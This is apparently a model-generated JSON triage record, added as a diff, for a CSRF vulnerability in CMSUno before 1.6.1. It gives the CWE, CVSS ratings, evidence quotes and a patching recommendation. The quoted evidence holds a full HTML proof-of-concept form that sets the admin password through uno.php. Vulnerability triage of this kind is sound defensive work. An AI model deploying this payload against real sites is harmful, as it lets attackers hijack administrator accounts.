@@ -1,0 +1,65 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "CMSUno before 1.6.1 contains a cross-site request forgery (CSRF) vulnerability in uno.php that allows changing the admin password via a crafted POST request.",
+    "affected_product": "CMSUno before 1.6.1",
+    "cwe": "CWE-352",
+    "cwe_quote": "uno.php allows CSRF to change the admin password.",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "form action=\u201chttp://127.0.0.1/cmsuno-master/uno.php\u201dmethod=\u201cPOST\u201d"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": ""
+      },
+      "UI": {
+        "value": "R",
+        "quote": "PoC :\n\n<html>\n<body>\n<script>history.pushState(\",\",'/')</script>\n<form action=\u201chttp://127.0.0.1/cmsuno-master/uno.php\u201dmethod=\u201cPOST\u201d>\n<input type=\u201chidden\u201d name=\u201cuser\u201d value=\u201cadmin\u201d/>\n<input type=\u201chidden\u201d name=\u201cpass\u201d value=\u201cyourpassword\u201d/>\n<input type=\u201csubmit\u201d name=\u201cuser\u201d value=\u201cSubmit request\u201d/>\n</form>\n</body>\n</html>"
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "N",
+        "quote": ""
+      },
+      "I": {
+        "value": "H",
+        "quote": "uno.php allows CSRF to change the admin password."
+      },
+      "A": {
+        "value": "N",
+        "quote": ""
+      }
+    },
+    "recommended_next_step": "Verify the vulnerability by reproducing the POST request against a test instance and determine whether CSRF protections (anti-CSRF tokens, SameSite cookies, or referer checks) are absent; if confirmed, patch uno.php to require a server-side anti-CSRF token and release fixes and mitigation guidance.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Vulnerability description",
+        "quote": "uno.php allows CSRF to change the admin password."
+      },
+      {
+        "claim": "Proof-of-concept shows POST to uno.php",
+        "quote": "form action=\u201chttp://127.0.0.1/cmsuno-master/uno.php\u201dmethod=\u201cPOST\u201d"
+      },
+      {
+        "claim": "PoC supplies admin username and new password",
+        "quote": "<input type=\u201chidden\u201d name=\u201cuser\u201d value=\u201cadmin\u201d/>\n<input type=\u201chidden\u201d name=\u201cpass\u201d value=\u201cyourpassword\u201d/>"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 1832,
+    "output_tokens": 664,
+    "latency_s": null,
+    "batch": true
+  }
+}
